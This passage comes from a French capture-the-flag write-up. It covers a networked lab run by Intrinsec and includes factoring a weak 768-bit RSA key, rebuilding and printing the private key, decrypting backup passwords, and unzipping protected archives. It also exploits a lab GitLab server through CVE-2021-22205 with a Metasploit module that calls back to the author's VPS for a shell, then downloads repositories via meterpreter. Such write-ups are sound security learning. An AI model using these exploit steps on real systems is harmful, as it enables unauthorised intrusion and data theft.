</span></span><span style="display:flex;"><span>➜ openssl rsa -noout -text -inform PEM -in key.pub -pubin -modulus
</span></span><span style="display:flex;"><span>RSA Public-Key: <span style="color:#ff79c6">(</span><span style="color:#bd93f9">768</span> bit<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Modulus:
</span></span><span style="display:flex;"><span>    00:ca:d9:84:55:7c:97:e0:39:43:1a:22:6a:d7:27:
</span></span><span style="display:flex;"><span>    f0:c6:d4:3e:f3:d4:18:46:9f:1b:37:50:49:b2:29:
</span></span><span style="display:flex;"><span>    84:3e:e9:f8:3b:1f:97:73:8a:c2:74:f5:f6:1f:40:
</span></span><span style="display:flex;"><span>    1f:21:f1:91:3e:4b:64:bb:31:b5:5a:38:d3:98:c0:
</span></span><span style="display:flex;"><span>    df:ed:00:b1:39:2f:08:89:71:1c:44:b3:59:e7:97:
</span></span><span style="display:flex;"><span>    6c:61:7f:cc:73:4f:06:e3:e9:5c:26:47:60:91:b5:
</span></span><span style="display:flex;"><span>    2f:46:2e:79:41:3d:b5
</span></span><span style="display:flex;"><span>Exponent: <span style="color:#bd93f9">65537</span> <span style="color:#ff79c6">(</span>0x10001<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Modulus</span><span style="color:#ff79c6">=</span>CAD984557C97E039431A226AD727F0C6D43EF3D418469F1B375049B229843EE9F83B1F97738AC274F5F61F401F21F1913E4B64BB31B55A38D398C0DFED00B1392F0889711C44B359E7976C617FCC734F06E3E95C26476091B52F462E79413DB5
</span></span></code></pre></div><p>On le récupère en nombre avec python :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#bd93f9">0xCAD984557C97E039431A226AD727F0C6D43EF3D418469F1B375049B229843EE9F83B1F97738AC274F5F61F401F21F1913E4B64BB31B55A38D398C0DFED00B1392F0889711C44B359E7976C617FCC734F06E3E95C26476091B52F462E79413DB5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413</span>
</span></span></code></pre></div><p>On doit maintenant retrouver <strong>p</strong> et <strong>q</strong> qui sont les facteurs premiers de la clé .
On peut par exemple utiliser mon Tool : <a href="https://github.com/Vozec/Facto4CTF"  target="_blank" rel="noopener" >Facto4CTF</a> qui permet de factoriser des nombres trés grand avec plusieurs  algorithmes différent .</p>
<p><a href="http://www.factordb.com/"  target="_blank" rel="noopener" >http://www.factordb.com/</a> fonctionne aussi très bien mais <code>pourquoi utiliser factorDB quand on peut utiliser des courbes elliptiques ?</code></p>
<p>On obtient :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">p</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">q</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917</span>
</span></span></code></pre></div><p>On utilise <a href="https://github.com/ius/rsatool"  target="_blank" rel="noopener" >RsaTool</a> pour reconstruire la clé !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 rsatool.py -n <span style="color:#bd93f9">1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413</span> -p <span style="color:#bd93f9">33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489</span> -q <span style="color:#bd93f9">36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917</span> -e <span style="color:#bd93f9">65537</span>  -o privkey.key
</span></span></code></pre></div><p>Finalement, on a la <code>privekey.key</code></p>
<pre tabindex="0"><code>-----BEGIN RSA PRIVATE KEY-----
MIIBywIBAAJhAMrZhFV8l+A5Qxoiatcn8MbUPvPUGEafGzdQSbIphD7p+Dsfl3OK
wnT19h9AHyHxkT5LZLsxtVo405jA3+0AsTkvCIlxHESzWeeXbGF/zHNPBuPpXCZH
YJG1L0YueUE9tQIDAQABAmB0DeSHYEQoNbqtXhmQRTqdFtt5dtP4u5i/mcDAHL6b
nBK4CMgGg9HjRsFseawWKHTyjKYQwbl+Xh/66VclzgxrAxw+GIsXGHp5OzIsxABM
Vo52ybJYVC6iotbs1GL/9AECMQDZgux7RA4oadJTXlH5G6zD6266BC4Qbm+HXD0X
5T22X//W5OmjYITOYPg9dU3X9wECMQDuvm3SPOfpnA4iSf7MRBjDSvdOQYv6cUw3
kYKEFKsY8y/X4JMGKkmwMCJcyEX5mrUCMQCXWi353DJJ1tDe6Bv8TlCah+GlmLEB
CAedVgbA8OhPVl+tBd65q7jd7sXt5glDxQECMQCnEe/8Xc7U9fYWHL4H5+eEUuO5
ibkRK1Pw1w0ErQoGzbe/VFLOz6z9dNG3KBd/0rkCMH6J+q8/eK2Vi+vGXc92zSHp
lI4rshqBvhCfrDcrtBuu7b38Z1dz+ky1xc4ZO17bnA==
-----END RSA PRIVATE KEY-----
</code></pre><p>On peut l&rsquo;upload en la copiant collant et on peut décoder le fichier : <code>/backups/password.enc</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#bd93f9">400</span> /tmp/privekey.pem
</span></span><span style="display:flex;"><span>cat /backups/password.enc | base64 -d &gt; /tmp/decoded_bytes| openssl rsautl -decrypt -in /tmp/decoded_bytes -out /tmp/decoded.txt -inkey /tmp/privkey.pem
</span></span></code></pre></div><p>On obtient la clé , qui est aussi le flag : <code>RlUiPP2zI5v3uZiqKPej</code></p>
<h6 id="bonus--déchiffrement-des-backups">Bonus : Déchiffrement des backups</h6>
<p>Voici le script qui a chiffré les backups :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester@harvester:/backups$ cat backup.sh
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#!/bin/bash</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Please use the password in password.enc for safety. Ask the bigboss for questions.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$#</span><span style="color:#f1fa8c">&#34;</span> -ne <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">]</span>; <span style="color:#ff79c6">then</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;[-] Error. Usage : ./backup.sh &lt;file-to-backup&gt; &lt;password&gt;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># TODO : replace password encryption by public key encryption.</span>
</span></span><span style="display:flex;"><span>    zip -P <span style="color:#8be9fd;font-style:italic">$2</span> <span style="color:#8be9fd;font-style:italic">$1</span>.zip <span style="color:#8be9fd;font-style:italic">$1</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">fi</span>
</span></span></code></pre></div><p>On voit que c&rsquo;est un zip avec un mot de passe. Malheureusement , nous n&rsquo;avons pas de binaire sur la machine qui nous permette d&rsquo;extraire les fichiers .
On va donc utiliser python !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> zipfile <span style="color:#ff79c6">import</span> ZipFile
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file_name <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#34;backup-log-1.log.zip&#34;</span>,<span style="color:#f1fa8c">&#34;backup-log-2.log.zip&#34;</span>,<span style="color:#f1fa8c">&#34;backup-log-3.log.zip&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> name <span style="color:#ff79c6">in</span> file_name:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> ZipFile(name, <span style="color:#f1fa8c">&#39;r&#39;</span>) <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">zip</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">zip</span><span style="color:#ff79c6">.</span>printdir()
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">zip</span><span style="color:#ff79c6">.</span>extractall(<span style="color:#f1fa8c">&#39;/tmp/1&#39;</span>,pwd<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;RlUiPP2zI5v3uZiqKPej&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;Done!&#39;</span>)
</span></span></code></pre></div><p>Dans les fichiers , on trouve un <strong>Hint</strong> :</p>
<pre tabindex="0"><code>[HINT] Congratz you found me ! Post exploit is always important. Here&#39;s a gift to help you move forward on the challenge. : &#34;Im your father !&#34;
</code></pre><p>C&rsquo;est un Hint pour un des challenges précédent : Celui avec <strong>Empire</strong></p>
<hr>
<h2 id="financial-statement">Financial statement</h2>
<ul>
<li><strong>Nom</strong>  : Financial statement</li>
<li><strong>Point</strong> : 0</li>
<li><strong>Description</strong> :
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>We need more information to <span style="color:#ff79c6">continue</span> our investigation. We are confident that their financial operations are beyond our control. Find out more about their <span style="color:#bd93f9">2021</span> financials and their victims!
</span></span><span style="display:flex;"><span>The flag is the total number of their income in 2021.
</span></span></code></pre></div></li>
</ul>
<h6 id="solution-3">Solution:</h6>
<p>On va ici revenir sur le nmap du début du ctf :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 192.168.51.2
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span> <span style="color:#6272a4">#Inconnu</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 192.168.51.3
</span></span><span style="display:flex;"><span>5432/tcp open       PostgreSQL DB 9.6.0 or later
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 192.168.51.5
</span></span><span style="display:flex;"><span>22/tcp   open  ssh
</span></span><span style="display:flex;"><span>80/tcp   open  http             <span style="color:#6272a4"># GITLAB</span>
</span></span><span style="display:flex;"><span>8181/tcp open  intermapper      <span style="color:#6272a4"># Gestion de serveur = intermapper</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.14.1.1 // 192.168.51.1
</span></span><span style="display:flex;"><span>22/tcp   open  ssh
</span></span><span style="display:flex;"><span>80/tcp   open  http             <span style="color:#6272a4"># Page Phising microsoft</span>
</span></span><span style="display:flex;"><span>3000/tcp open  ppp              <span style="color:#6272a4"># Login Custom</span>
</span></span><span style="display:flex;"><span>8000/tcp open  http-alt         <span style="color:#6272a4"># phpmyadmin</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.14.1.2
</span></span><span style="display:flex;"><span>2048/tcp open  caldav  <span style="color:#6272a4"># Intéressant</span>
</span></span></code></pre></div><p>Le GitLab en <code>192.168.51.5</code> sur le port <code>80</code> n&rsquo;a pas encore était exploré</p>
<p>A ce stade du ctf , j&rsquo;ai tenté beaucoup de choses , bruteforce de login , détection de vulnérabilité sur le serveur , etc ..
Finalement , il se trouve qu&rsquo;il est <strong>vulnérable</strong> à la <code>CVE-2021-22205</code> qui concerne les exifs .</p>
<p>Par chance, metasploit nous présente encore une fois un exploit rapide à mettre en place !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains msfconsole -q
</span></span><span style="display:flex;"><span>search gitlab
</span></span><span style="display:flex;"><span>use multi/http/gitlab_exif_rce
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">set</span> RHOSTS 192.168.51.5
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">set</span> SRVPORT <span style="color:#bd93f9">1337</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">set</span> LHOST ip_vps..
</span></span><span style="display:flex;"><span>exploit
</span></span></code></pre></div><p>Shell :)</p>
<p>Maintenant, le but va être de copié et de déchiffrer les fichiers du gitlab .
<strong>2 Solutions</strong> s&rsquo;offrent à nous :</p>
<ul>
<li><code>Monter un Gitlab en local et importer les fichiers</code></li>
<li><code>Copié les fichiers et tenter de les décoder comme un margoulin x)</code></li>
</ul>
<p>Spoiler : Je prend l&rsquo;option 2 !!</p>
<p>Aprés avoir passé 2h à tenter de monter un docker et d&rsquo;y importer les fichiers sans succés .</p>
<p>Les fichiers sont situés en : <code>/home/git/data/repositories/@hashed</code>
Grâce au shell meterpreter , on peut tous télécharger:</p>
<pre tabindex="0"><code>download /home/git/data/repositories/
</code></pre><p>Si on regarde l&rsquo;arborescence , on peut voir quelque chose :</p>
<p><img src="./img/git.png" alt="AltText"></p>
<p>Oui des <code>git</code> !</p>
<p>On peut lancer une console <a href="https://docs.gitlab.com/ee/administration/operations/rails_console.html"  target="_blank" rel="noopener" >&lt;code&gt;gitlab-rails&lt;/code&gt;</a> afin d&rsquo;identifier le nom des répos.</p>
<p>On tape :</p>
<pre tabindex="0"><code>ProjectRepository.find_by(disk_path: &#39;@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a&#39;).project
ProjectRepository.find_by(disk_path: &#39;@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&#39;).project
ProjectRepository.find_by(disk_path: &#39;@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&#39;).project
ProjectRepository.find_by(disk_path: &#39;@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35&#39;).project
ProjectRepository.find_by(disk_path: &#39;@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d&#39;).project
</code></pre><p>On obtient un nom intéressant : <code>Add accounting sheet (2021)</code></p>
<p>On peut le vérifier en se rendant dans le dossier :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>➜   git log
</span></span></code></pre></div><p><img src="./img/git2.png" alt="AltText"></p>
<p>Intéressant :) . On peut essayer de récupérer le fichier :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>➜   git checkout .
</span></span><span style="display:flex;"><span>fatal: this operation must be run in a work tree
</span></span></code></pre></div><p>Hum .. Une recherche rapide et on trouve cet <a href="https://technoteshelp.com/git-fatal-this-operation-must-be-run-in-a-work-tree/"  target="_blank" rel="noopener" >article</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>➜   git --work-tree<span style="color:#ff79c6">=</span>. checkout master
</span></span><span style="display:flex;"><span>Already on <span style="color:#f1fa8c">&#39;master&#39;</span>
</span></span><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>➜   ls
</span></span><span style="display:flex;"><span>accounting-2021.xlsx  branches  config  description  HEAD  hooks  index  info  language-stats.cache  logs  objects  refs
</span></span></code></pre></div><p>On a : <code>accounting-2021.xlsx</code> !
En l&rsquo;ouvrant :</p>
<pre tabindex="0"><code>Company	Amount	Paid
Biboy	54000	yes
Tyro	31999	yes
Strawton	9000	no
Tipo	863789	yes
Opo	8231	no
Miuop	87688	yes
</code></pre><p>On somme tous ceux qui ont étaient payés et on a enfin le dernier flag ! <code>1037476</code></p>
<hr>
<h1 id="conclusion">Conclusion</h1>
<p>C&rsquo;était un super CTF, je n&rsquo;avais jamais fait ce genre de compétition avec un réseau de la sorte ou toutes les machines communiquent entre elles et ou on joue dans ce genre de lab. Ça change des challenges classiques : RCE &gt; PRIVESC &gt; FLAG &gt; CHALL. SUIVANT.
Encore un grand bravo <a href="https://www.intrinsec.com/"  target="_blank" rel="noopener" >Intrinsec</a> et à <a href="https://twitter.com/th1b4ud"  target="_blank" rel="noopener" >Th1b4ud</a>  qui à tous géré solo pendant la compétition . A refaire !</p>
<p>Par ailleurs , je suis fier d&rsquo;avoir fini premier au classement !
<img src="./img/scoreboard.png" alt="Alttext"></p>

  </article>

</div>


  </div>
<script type="text/javascript" src="/main.js" defer></script>


<script async src="https://www.googletagmanager.com/gtag/js?id=G-3EGPCQCHEK"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-3EGPCQCHEK', { 'anonymize_ip': false });
}
</script>

</body>

</html>